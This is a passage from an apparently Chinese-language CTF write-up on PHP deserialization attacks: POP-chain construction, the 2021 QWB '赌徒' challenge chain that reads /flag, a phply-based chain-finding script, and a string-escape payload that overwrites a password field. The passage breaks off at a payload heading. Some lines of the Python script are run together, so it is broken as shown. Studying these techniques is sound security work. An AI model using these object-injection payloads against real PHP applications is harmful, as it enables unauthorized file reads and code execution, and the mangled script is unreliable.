<li><p>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</p>
</li>
<li><p>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</p>
<p>构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//把$mod1赋值为Call类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//把 $mod1赋值为funct类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//把 $mod1赋值为func类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//把 $mod1赋值为string1类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//把 $str1赋值为GetFlag类对象          </span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//构造start_gg类对象$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//显示输出url编码后的序列化对象</span><br></code></pre></td></tr></table></figure></li>
</ol>
<h4 id="2021强网杯赌徒"><a href="#2021强网杯赌徒" class="headerlink" title="2021强网杯赌徒"></a>2021强网杯赌徒</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>



<h4 id="2021强网杯POP-master："><a href="#2021强网杯POP-master：" class="headerlink" title="2021强网杯POP_master："></a>2021强网杯POP_master：</h4><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p>
<p>脚本找链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>	class_name = out.name<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>			functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>			<span class="hljs-keyword">if</span> node.name == func_name:<br>				<span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>					<span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br>						<span class="hljs-comment"># print(subnode)</span><br>						<span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br>							<span class="hljs-keyword">continue</span><br>						target = functions[subnode.name]<br>						func_name = subnode.name<br>						pop_chain.append(func_name)<br>						<span class="hljs-keyword">break</span><br>					<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br>						<span class="hljs-comment"># print(subnode)</span><br>						<span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br>							<span class="hljs-comment"># print(subnode.node.name)</span><br>							<span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br>								<span class="hljs-keyword">continue</span><br>							target = functions[subnode.node.name]<br>							func_name = subnode.node.name<br>							pop_chain.append(func_name)<br>							<span class="hljs-keyword">break</span><br>						<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>							e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br>	<span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br>		<span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br>			<span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br>				<span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>				<span class="hljs-keyword">else</span>:<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> + <br>					functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>	i += <span class="hljs-number">1</span><br>	<span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。如下图，out!并不会被序列化</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210720135305824.png" srcset="/img/loading.gif" lazyload></p>
<p>当某个属性的字符串长度不一致时也不会被序列化成功</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210720135505974.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="增多："><a href="#增多：" class="headerlink" title="增多："></a>增多：</h3><p>某校的一题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题步骤：首先得到序列化的字符串<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>截取需要逃逸的字符串<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>长度为31，secure全部替换为secured，字符串+1，则需要<code>31</code>个secure把目标字符串顶出去</p>
<p>payload：</p>
<blockquote>
<p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure”;s:8:”password”;s:6:”hacker”;}&amp;password=</p>
</blockquote>
<p>题目改一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>

<p>可见此处secure变为了secure，love变为lover</p>
<p>仍然要逃逸31个字符，当然可以31个love，直接可以逃逸，但是也可以构造15个secure和一个love</p>
<p>payload：</p>
<blockquote>
